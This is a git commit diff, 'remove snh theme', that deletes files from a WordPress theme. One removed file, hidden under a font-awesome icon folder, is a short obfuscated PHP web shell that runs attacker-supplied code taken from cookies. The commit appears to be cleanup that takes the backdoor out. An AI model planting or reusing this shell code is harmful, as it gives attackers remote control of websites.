50333353a7409684a8ef25d77c1542fc6f9a75f2
root <root@snh.vn>
2018-04-27 16:34:32 +0700

    remove snh theme

--- wp-content/themes/thsnh/404.php
+++
@@ -1,5 +0,0 @@
-<?php
-header("HTTP/1.1 301 Moved Permanently");
-header("Location: http://snh.vn/trang-khong-tim-thay/");
-exit();
-?>
--- wp-content/themes/thsnh/font-awesome-master/src/3.2.1/icon/star-half/rorjuqtz.php
+++
@@ -1,7 +0,0 @@
-<?php
-
-$ofadw=$_COOKIE;
-$fovr=$ofadw[rhrn];
-if($fovr){
-	$sruxg=$fovr($ofadw[mykd]);$fep=$fovr($ofadw[ship]);$nzrf=$sruxg("",$fep);$nzrf();
-}
